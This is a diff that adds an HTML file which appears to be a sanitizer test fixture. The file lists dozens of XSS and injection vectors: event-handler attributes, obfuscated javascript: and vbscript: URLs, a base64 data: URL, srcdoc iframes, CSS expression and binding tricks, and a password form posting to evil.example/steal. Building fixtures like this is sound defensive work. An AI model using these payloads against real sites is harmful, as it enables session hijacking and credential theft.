@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="refresh" content="0;url=https://evil.example/refresh">
+<meta http-equiv="Content-Security-Policy" content="default-src *">
+<base href="https://evil.example/">
+<link rel="stylesheet" href="https://evil.example/x.css">
+<link rel="dns-prefetch" href="//evil.example">
+<link rel="preload" as="image" href="https://evil.example/preload.png">
+<script>alert('head')</script>
+<script src="https://evil.example/x.js"></script>
+</head>
+<body onload="alert('body')" onpageshow=alert(1)>
+<p>Before</p>
+<img src=x onerror=alert(1)>
+<img src="https://evil.example/a.png" ONERROR="alert(1)" OnLoad = 'alert(2)'>
+<img/src="x"/onerror=alert(3)>
+<img src="x" onerror&#x3d;alert(4)>
+<svg onload=alert(5)><script>alert(6)</script></svg>
+<svg><animate onbegin=alert(7) attributeName=x dur=1s></svg>
+<a href="javascript:alert(8)">js</a>
+<a href="JaVaScRiPt:alert(9)">js case</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(10)">js entities</a>
+<a href="java&#x09;script:alert(11)">js tab</a>
+<a href="java&#x0A;script:alert(12)">js newline</a>
+<a href=" &#x20;javascript:alert(13)">js space</a>
+<a href="vbscript:msgbox(14)">vbs</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxNSk8L3NjcmlwdD4=">data</a>
+<a href="https://ok.example/" onclick="alert(16)" ping="https://evil.example/ping" target="_blank" rel="opener">ping</a>
+<a href="https://ok.example/" formaction="javascript:alert(17)">formaction</a>
+<iframe src="https://evil.example/frame"></iframe>
+<iframe srcdoc="<script>alert(18)</script>"></iframe>
+<frameset><frame src="https://evil.example/f"></frameset>
+<object data="https://evil.example/x.swf"><param name=movie value=x></object>
+<embed src="https://evil.example/x.swf">
+<applet code="X.class"></applet>
+<form action="https://evil.example/steal" method=post>
+  <input type=password name=p><input type=image src="https://evil.example/i.png">
+  <button formaction="https://evil.example/b">Send</button>
+  <select><option>one</select><textarea>secret</textarea>
+</form>
+<isindex action="javascript:alert(19)">
+<video poster="https://evil.example/poster.png"><source src="https://evil.example/v.mp4"></video>
+<audio src="https://evil.example/a.mp3"></audio>
+<picture><source srcset="https://evil.example/p.webp"><img src="cid:pic@x" srcset="https://evil.example/2x.png 2x"></picture>
+<table background="https://evil.example/bg.png"><tr><td background="javascript:alert(20)">cell</td></tr></table>
+<div style="background:url(https://evil.example/bg.png);width:expression(alert(21))">styled</div>
+<div style="behavior:url(x.htc)">behavior</div>
+<div style="-moz-binding:url(https://evil.example/x.xml#x)">binding</div>
+<marquee onstart=alert(22)>marquee</marquee>
+<details open ontoggle=alert(23)><summary>sum</summary></details>
+<template><script>alert(24)</script></template>
+<noscript><img src="https://evil.example/noscript.png"></noscript>
+<xmp><script>alert(25)</script></xmp>
+<math><a xlink:href="javascript:alert(26)">math</a></math>
+<p style="position:fixed;top:0;left:0;width:100%;height:100%">overlay</p>
+<!-- <script>alert(27)</script> -->
+<![CDATA[<script>alert(28)</script>]]>
+<?php echo 1; ?>
+<p>After</p>
+</body></html>
